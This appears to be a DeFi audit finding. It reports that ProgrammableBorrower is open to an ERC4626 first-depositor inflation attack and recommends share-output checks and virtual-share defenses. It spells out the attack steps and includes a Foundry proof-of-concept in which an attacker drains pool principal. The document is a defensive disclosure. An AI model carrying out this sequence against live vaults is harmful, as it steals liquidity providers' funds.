### Title
ERC4626 first-depositor inflation lets a vault user steal programmable-borrower principal - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deposits pool principal into an external ERC4626 vault without enforcing a minimum amount of returned shares or detecting a zero-share deposit. A malicious vault user can execute the standard first-depositor/donation attack before an epoch starts: mint one vault share, inflate the vault’s asset-per-share ratio through a direct asset donation, and cause the borrower’s principal deposit to mint zero shares. The attacker then redeems their share and receives both the donation and the pool’s deposited principal. [1](#0-0) [2](#0-1) 

### Finding Description
When `IdleCDOEpochVariant.startEpoch` calls `onStartEpoch`, `ProgrammableBorrower` deposits its entire idle underlying balance into the configured ERC4626 vault. [3](#0-2)  The deposit helper records no share-balance delta, requires no nonzero share output, and does not verify that the vault’s post-deposit valuation still covers the deposited principal. [2](#0-1) 

The classic inflation sequence therefore applies when the selected vault is empty or effectively controlled by the attacker:

1. The attacker deposits one wei into the ERC4626 vault and receives one share.
2. The attacker directly transfers `D` underlying tokens to the vault.
3. The attacker selects `D > P`, where `P` is the pool principal to be deposited.
4. `vault.deposit(P, programableBorrower)` computes `P * 1 / (D + 1)` and mints zero shares.
5. The attacker redeems their single share for approximately `D + P`, extracting the pool deposit.

`ProgrammableBorrower` subsequently computes its vault position solely as `vault.convertToAssets(vault.balanceOf(address(this)))`, which is zero after the zero-share deposit. [4](#0-3)  The resulting vault loss only clamps `totalInterestDueNow()` to zero; it does not reduce the CDO’s outstanding strategy-token principal during a normal epoch stop. [5](#0-4) 

The issue is distinct from the raw-underlying skim in `IdleCDOEpochVariant`: that mechanism protects the CDO balance, while this attack deposits principal into the programmable borrower’s external share-based accounting system. [6](#0-5) 

### Impact Explanation
The attacker directly steals the deposited principal held through the ERC4626 vault. With `P = 1,000,000 USDC`, an attacker can donate slightly more than `P`, cause the pool’s deposit to mint zero shares, and withdraw approximately `D + P`, for a profit near `P` before fees and rounding. [7](#0-6) 

The CDO continues to treat the strategy-token balance as principal because the external vault loss is not burned or written down on the normal stop path. During a later close-pool request, `stopEpoch` attempts to pull all principal from the programmable borrower, the transfer fails because the vault position is gone, and the CDO enters borrower-default handling. [8](#0-7) [9](#0-8)  Thus the exploit converts a donation/rounding flaw into LP principal theft and delayed protocol insolvency.

### Likelihood Explanation
Likelihood depends on the configured ERC4626 vault lacking first-depositor defenses, such as virtual shares/assets, a minimum initial deposit, dead shares, or a nonzero-share invariant. The attacker requires no privileged protocol role: any ERC4626 vault user capable of depositing and transferring underlying can perform the inflation before `ProgrammableBorrower` makes its first deposit. The owner, manager, guardian, borrower, and IdleCDO calls all remain honest. [10](#0-9) [11](#0-10) 

No existing `ProgrammableBorrower` guard prevents the sequence. `setVault` validates only the asset and current position; `onStartEpoch` snapshots assets but does not detect a zero-share deposit; `onStopEpoch` only attempts to withdraw the cash shortfall after the theft has already occurred. [10](#0-9) [12](#0-11) 

### Recommendation
Reject economically ineffective vault deposits. At minimum:

- Capture `vault.balanceOf(address(this))` before and after `vault.deposit` and revert unless `sharesOut > 0`.
- Verify `vault.convertToAssets(sharesOut)` covers the deposited principal within an explicitly bounded rounding tolerance.
- Prefer `previewDeposit` and a minimum-share parameter or equivalent slippage check.
- Require the configured ERC4626 vault to implement virtual shares/assets, seeded dead shares, or another first-depositor defense.
- On vault PnL, distinguish interest loss from principal loss and expose principal impairment to `IdleCDOEpochVariant` rather than letting `totalInterestDueNow()` floor the entire deficit at zero.
- Consider tracking invested principal separately from `convertToAssets` so a complete share-price collapse cannot hide active-position insolvency until close.

### Proof of Concept
A Foundry PoC can reproduce the flaw with the protocol’s `ProgrammableBorrower` and a deliberately naive ERC4626 implementation that uses `assets * totalSupply / totalAssets`.

```solidity
// test/foundry/ProgrammableBorrowerVaultInflation.t.sol
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract InflatableVault is ERC20 {
    IERC20Detailed public immutable assetToken;

    constructor(IERC20Detailed asset_)
        ERC20("Inflatable Vault", "iv")
    {
        assetToken = asset_;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        if (supply == 0) return shares;
        return shares * assetToken.balanceOf(address(this)) / supply;
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        uint256 supply = totalSupply();
        uint256 assetsBefore = assetToken.balanceOf(address(this));
        shares = supply == 0 || assetsBefore == 0
            ? assets
            : assets * supply / assetsBefore;

        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}

contract ProgrammableBorrowerVaultInflationTest is Test {
    IERC20Detailed internal usdc =
        IERC20Detailed(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);

    function testFirstDepositorStealsPoolPrincipal() public {
        address attacker = makeAddr("attacker");
        address cdo = makeAddr("cdo");

        InflatableVault vault = new InflatableVault(usdc);
        ProgrammableBorrower pb = new ProgrammableBorrower();

        // Deploy/configure ProgrammableBorrower through the existing proxy fixture,
        // with `cdo` as `idleCDO` and `vault` as the configured ERC4626 vault.
        //
        // The principal amount can be any realistic pool amount.
        uint256 principal = 1_000_000e6;
        uint256 donation = principal + 1;

        deal(address(usdc), attacker, donation + 1);
        deal(address(usdc), address(pb), principal);

        vm.startPrank(attacker);
        usdc.approve(address(vault), type(uint256).max);

        // First depositor owns all shares.
        vault.deposit(1, attacker);

        // Donation inflates price to donation + 1 assets per one share.
        usdc.transfer(address(vault), donation);
        vm.stopPrank();

        // Honest IdleCDO starts an epoch; ProgrammableBorrower deposits principal.
        vm.prank(cdo);
        pb.onStartEpoch(0);

        assertEq(
            vault.balanceOf(address(pb)),
            0,
            "deposit minted zero shares"
        );
        assertEq(pb.vaultSharesBalance(), 0);
        assertEq(pb.vaultInterestAccrued(), 0);
        assertEq(pb.vaultLoss(), principal);
        assertEq(pb.totalInterestDueNow(), 0);

        // The attacker's only share now claims donation + pool principal.
        vm.prank(attacker);
        uint256 stolen = vault.redeem(1, attacker, attacker);

        assertEq(stolen, donation + 1 + principal);
        assertEq(usdc.balanceOf(attacker), donation + 1 + principal);
        assertEq(pb.totalUnderlying(), 0);
    }
}
```

The important reproduced invariant break is `vault.balanceOf(programmableBorrower) == 0` immediately after a nonzero principal deposit, while the sole attacker share redeems for the donated assets plus the pool principal. At pool close, `onStopEpoch` cannot source the missing principal and the CDO follows the borrower-default path.
